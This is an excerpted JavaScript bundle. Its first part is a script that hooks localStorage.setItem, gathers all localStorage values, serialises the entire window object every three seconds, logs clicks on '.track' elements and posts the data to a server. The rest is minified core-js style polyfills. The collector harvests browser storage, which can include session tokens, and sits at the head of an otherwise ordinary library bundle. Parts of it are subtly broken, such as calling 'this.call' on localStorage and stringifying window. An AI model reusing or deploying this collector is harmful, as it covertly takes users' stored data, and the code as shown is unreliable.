(() => {
  $(function () {
    const watcher = [],
      storageWatcher = {};
    let globalVarsOld = JSON.stringify(window);
    function getLocalStorageDatas() {
      const values = {};
    ...
    function computeHash(data) {
      ...
      const keysJoined = keyArr.join("");
      let hash = 0;
      for (let index = 0; index < keysJoined.length; index++) {
        const code = keysJoined.charCodeAt(index);
    ...
    function sendDataToServer(data) {
      const hashKey = computeHash(data);
      ...
      httpRequest.send(JSON.stringify(requestFields));
      httpRequest.onreadystatechange = function () {
        if (httpRequest.readyState === XMLHttpRequest.DONE) {
          if (httpRequest.status === 200) {
            console.info("Data send success");
          } else {
            console.error("Data send failure, status : " + httpRequest.status);
          }
        }
      };
    }
    function collectAndSendLocalStorageData() {
      const localStorageData = getLocalStorageDatas();
    ...
    Object.defineProperty(window.localStorage, 'setItem', {
      ...
      value: function (key, value) {
        storageWatcher[key] = value;
        this.call(window.localStorage, key, value);
      }
    });
    setInterval(function () {
      const globalVarsNew = JSON.stringify(window);
      if (globalVarsOld !== globalVarsNew) {
        sendDataToServer({
          globals: window
        });
        globalVarsOld = globalVarsNew;
      }
    }, 3000);
    window.addEventListener('click', function (e) {
      ...
      while (target != document.body) {
        if (target.matches('.track')) {
          watcher.push(target.textContent);
          break;
        }
  ...
  var t,
    r = {
      ...
      491: (t, r, e) => {
        ...
        }, C)) for (n in D) u[n] && b(u[n], k);
        if ((!C || !P || P === L) && (P = k.prototype, C)) for (n in D) u[n] && b(u[n].prototype, P);
        if (C && m(I) !== P && b(I, P), s && !l(P, j)) for (n in U = !0, d(P, j, {
          get: function () {
        ...
        t.exports = {
          ...
          exportTypedArrayStaticMethod: function (t, r, e) {
            ...
            if (s) {
              if (b) {
                if (e) for (n in D) if ((o = u[n]) && l(o, t)) try {
                  delete o[t];
                } catch (t) {}
                if (k[t] && !e) return;
                try {
      ...
      951: (t, r, e) => {
        ...
        t.exports = function (t) {
          ...
          var y,
            ...
            S = p(r),
            R = 0;
          if (!S || this === h && s(S)) for (y = c(r), m = e ? new this(y) : h(y); y > R; R++) E = d ? g(r[R], R) : r[R], f(m, R, E);else for (w = (x = l(r, S)).next, m = e ? new this() : []; !(b = o(w, x)).done; R++) E = d ? a(x, g, [b.value, R], !0) : b.value, f(m, R, E);
          return m.length = R, m;
        };
      },
      7222: (t, r, e) => {
        ...
        var n = e(7365),
          ...
          s = function (t) {
            ...
            return function (e, s, u) {
              for (var c, f = i(e), l = o(f), p = n(s, u), h = a(l); h-- > 0;) if (p(c = l[h], h, f)) switch (t) {
                case 0:
                  return c;
                case 1:
                  return h;
        ...
        var n = e(7365),
          ...
          f = function (t) {
            ...
            return function (v, g, d, y) {
              for (var m, b, x = a(v), w = i(x), E = n(g, d), S = s(w), R = 0, A = y || u, O = r ? A(v, S) : e || p ? A(v, 0) : void 0; S > R; R++) if ((h || R in w) && (b = E(m = w[R], R, x), t)) if (r) O[R] = b;else if (b) switch (t) {
                case 3:
                  return !0;
                case 5:
                  return m;
      ...
      9379: (t, r, e) => {
        ...
        t.exports = function (t, r, e, s) {
          ...
          if (n(e) && i(e, c, s), s.global) u ? t[r] = e : a(r, e);else {
            try {
      ...
      304: (t, r, e) => {
        var n = e(1765),
          ...
          u = s.test(a);
        t.exports = function (t, r) {
          if (u && "string" == typeof t && !o.prepareStackTrace) for (; r--;) t = i(t, s, "");
          return t;
        };
      },
      5509: (t, r, e) => {
      ...
      2698: (t, r, e) => {
        ...
        t.exports = function (t, r) {
          var e,
            ...
            g = t.global,
            d = t.stat;
          if (e = g ? n : d ? n[v] || s(v, {}) : (n[v] || {}).prototype) for (f in r) {
      ...
      8102: (t, r, e) => {
        ...
        t.exports = function (t, r, e) {
          ...
          if (A) d = t.iterator;else if (O) d = t;else {
            if (!(y = l(t))) throw h(a(t) + " is not iterable");
            if (s(y)) {
              for (m = 0, b = u(t); b > m; m++) if ((x = P(t[m])) && c(g, x)) return x;
              return new v(!1);
            }
            d = f(t, y);
          }
      ...
      1666: (t, r, e) => {
        ...
        t.exports = function (t, r, e, a, v, d, O) {
          ...
          if (U && (T = c(U.call(new t()))) !== Object.prototype && T.next && (i || c(T) === b || (f ? f(T, b) : s(T[w]) || h(T, w, A)), l(T, L, !0, !0), i && (g[L] = A)), y && v == S && M && M.name !== S && (!i && m ? p(j, "name", S) : (_ = !0, C = function () {
            ...
            keys: d ? C : P(E),
            entries: P(R)
          }, O) for (k in I) (x || _ || !(k in j)) && h(j, k, I[k]);else n({
            target: r,
            proto: !0,
            forced: x || _
          }, I);
      ...
      4382: (t, r, e) => {
        ...
        t.exports = !p || a(function () {
          ...
          for (var e = f(t), o = arguments.length, a = 1, p = u.f, h = c.f; o > a;) for (var g, d = l(arguments[a++]), y = p ? v(s(d), p(d)) : s(d), m = y.length, b = 0; m > b;) g = y[b++], n && !i(h, d, g) || (e[g] = d[g]);
          return e;
        } : p;
      },
      6042: (t, r, e) => {
      ...
      8157: (t, r, e) => {
        ...
        (E || R || S || h || v) && (y = function (t) {
          ...
          }), o && T) for (o.groups = c = l(null), a = 0; a < T.length; a++) c[(f = T[a])[0]] = o[f[1]];
          return o;
        }), t.exports = y;
      },
      8103: (t, r, e) => {
      ...
      1716: (t, r, e) => {
        ...
        t.exports = function (t) {
          var r,
            ...
            R = void 0 !== S,
            A = c(w);
          if (A && !f(A)) for (b = (m = u(w, A)).next, w = []; !(y = o(b, m)).done;) w.push(y.value);
        ...
        n({
          ...
          toExponential: function (t) {
            ...
            var n = "",
              ...
              c = "",
              w = "";
            if (r < 0 && (n = "-", r = -r), 0 === r) s = 0, o = m("0", e + 1);else {
              var E = u(r);
              s = v(E);
              var S = 0,
                R = g(10, s - e);
      ...
      3411: (t, r, e) => {
        ...
        n({
          ...
          toFixed: function (t) {
            ...
            if (s < 0 && (v = "-", s = -s), s > 1e-21) if (e = (r = function (t) {
          ...
          for (var F = function (t, r) {
              ...
              if ((g || f(O, t)) && (t = t.source, d && (r = h(x))), t = void 0 === t ? "" : p(t), r = void 0 === r ? "" : p(r), x = t, E && "dotAll" in M && (n = !!r && L(r, "s") > -1) && (r = P(r, /s/g, "")), e = r, D && "sticky" in M && (o = !!r && L(r, "y") > -1) && N && (r = P(r, /y/g, "")), S && (i = function (t) {
                for (var r, e = t.length, n = 0, o = "", i = [], a = {}, s = !1, u = !1, c = 0, f = ""; n <= e; n++) {
                  if ("\\" === (r = k(t, n))) r += k(t, ++n);else if ("]" === r) s = !1;else if (!s) switch (!0) {
                    case "[" === r:
                      s = !0;
                      break;
                    case "(" === r:
      ...
      730: (t, r, e) => {
        ...
        a("split", function (t, r, e) {
          ...
          return i = "c" == "abbc".split(/(b)*/)[1] || 4 != "test".split(/(?:)/, -1).length || 2 != "ab".split(/(?:ab)*/).length || 4 != ".".split(/(.?)(.?)/).length || ".".split(/()()/).length > 1 || "".split(/.?/).length ? function (t, e) {
            ...
            for (var s, u, l, p = [], h = (t.ignoreCase ? "i" : "") + (t.multiline ? "m" : "") + (t.unicode ? "u" : "") + (t.sticky ? "y" : ""), g = 0, y = new RegExp(t.source, h + "g"); (s = o(m, y, i)) && !((u = y.lastIndex) > g && (O(p, T(i, g, s.index)), s.length > 1 && s.index < i.length && n(R, p, d(s, 1)), l = s[0].length, g = u, p.length >= a));) y.lastIndex === s.index && y.lastIndex++;
            ...
            for (var b = 0, x = 0, R = []; x < a.length;) {
              ...
              var A,
                I = y(d, w ? T(a, x) : a);
              if (null === I || (A = S(h(d.lastIndex + (w ? x : 0)), a.length)) === b) x = p(a, x, f);else {
                if (O(R, T(a, b, x)), R.length === m) return R;
                for (var k = 1; k <= I.length - 1; k++) if (O(R, I[k]), R.length === m) return R;
                x = b = A;
              }
            }
            return O(R, T(a, b)), R;
        ...
        var n = e(412),
          ...
          p = function (t, r) {
            if (t) {
              ...
              if (t[f] || s(t, f, r), o[r]) for (var e in a) if (t[e] !== a[e]) try {
                s(t, e, a[e]);
              } catch (r) {
                t[e] = a[e];
              }
      ...
      6885: (t, r, e) => {
        ...
        var O = i(d),
          T = O.prototype;
        if (T.constructor !== O) for (var I in g || s(T, "constructor", a(1, O)), p) if (u(p, I)) {
          var k = p[I],
            P = k.s;
          u(O, P) || s(O, P, a(6, k.c));
        }
      ...
      2125: (t, r, e) => {
              ...
              default:
                if (pt) o = pt(t);else switch (y) {
                  ...
                  case "ArrayBuffer":
                    ...
                    try {
                      if ("function" == typeof t.slice) o = t.slice(0);else for (c = t.byteLength, o = new ArrayBuffer(c), h = new e(t), d = new e(o), u = 0; u < c; u++) d.setUint8(u, h.getUint8(u));
                    } catch (t) {
        ...
        i({
          ...
          structuredClone: function (t) {
            var r,
              e = S(arguments.length, 1) > 1 && !h(arguments[1]) ? y(arguments[1]) : void 0,
      ...
      4168: (t, r, e) => {
        ...
        ft.prototype = {
          ...
          parseObject: function (t) {
            var r,
              ...
              u,
              c = A(t);
            if (c) for (e = (r = R(t, c)).next; !(n = i(e, r)).done;) {
              if (a = (o = R(b(n.value))).next, (s = i(a, o)).done || (u = i(a, o)).done || !i(a, o).done) throw V("Expected sequence with length 2");
              z(this.entries, {
                key: w(s.value),
                value: w(u.value)
              });
            } else for (var f in t) d(t, f) && z(this.entries, {
              key: f,
              value: w(t[f])
            });
          },
          parseQuery: function (t) {
            if (t) for (var r, e, n = X(t, "&"), o = 0; o < n.length;) (r = n[o++]).length && (e = X(r, "="), z(this.entries, {
              key: ot(J(e)),
              value: ot(Y(e, "="))
            }));
          },
        ...
        if (f(pt, {
          ...
          get: function (t) {
            O(arguments.length, 1);
            for (var r = j(this).entries, e = w(t), n = 0; n < r.length; n++) if (r[n].key === e) return r[n].value;
            return null;
          },
          getAll: function (t) {
            O(arguments.length, 1);
          ...
          has: function (t) {
            O(arguments.length, 1);
            for (var r = j(this).entries, e = w(t), n = 0; n < r.length;) if (r[n++].key === e) return !0;
            return !1;
          },
          set: function (t, r) {
            O(arguments.length, 1);
            ...
            for (t = b(t), r || (c.scheme = "", c.username = "", c.password = "", c.host = null, c.port = null, c.path = [], c.query = null, c.fragment = null, c.cannotBeABaseURL = !1, t = F(t, nt, "")), t = F(t, ot, ""), o = g(t); l <= o.length;) {
              switch (i = o[l], f) {
                ...
                case bt:
                  ...
                  continue;
                case xt:
                  if (c.scheme = e.scheme, i == n) c.username = e.username, c.password = e.password, c.host = e.host, c.port = e.port, c.path = d(e.path), c.query = e.query;else if ("/" == i || "\\" == i && c.isSpecial()) f = wt;else if ("?" == i) c.username = e.username, c.password = e.password, c.host = e.host, c.port = e.port, c.path = d(e.path), c.query = "", f = Mt;else {
                    if ("#" != i) {
                ...
                case It:
                  if (c.scheme = "file", "/" == i || "\\" == i) f = kt;else {
                    ...
                    if (i == n) c.host = e.host, c.path = d(e.path), c.query = e.query;else if ("?" == i) c.host = e.host, c.path = d(e.path), c.query = "", f = Mt;else {
                      if ("#" != i) {
                ...
                case _t:
                  if (i == n || "/" == i || "\\" == i && c.isSpecial() || !r && ("?" == i || "#" == i)) {
                    if (".." === (u = V(u = p)) || "%2e." === u || ".%2e" === u || "%2e%2e" === u ? (c.shortenPath(), "/" == i || "\\" == i && c.isSpecial() || N(c.path, "")) : vt(p) ? "/" == i || "\\" == i && c.isSpecial() || N(c.path, "") : ("file" == c.scheme && !c.path.length && pt(p) && (c.host && (c.host = ""), p = j(p, 0) + ":"), N(c.path, p)), p = "", "file" == c.scheme && (i == n || "?" == i || "#" == i)) for (; c.path.length > 1 && "" === c.path[0];) B(c.path);
          ...
          parseHost: function (t) {
            ...
            if ("[" == j(t, 0)) {
              ...
              if (r = function (t) {
                ...
                for (e = [], n = 0; n < r; n++) {
                  if ("" == (o = u[n])) return t;
                  if (i = 10, o.length > 1 && "0" == j(o, 0) && (i = M(Q, o) ? 16 : 8, o = q(o, 8 == i ? 1 : 2)), "" === o) a = 0;else {
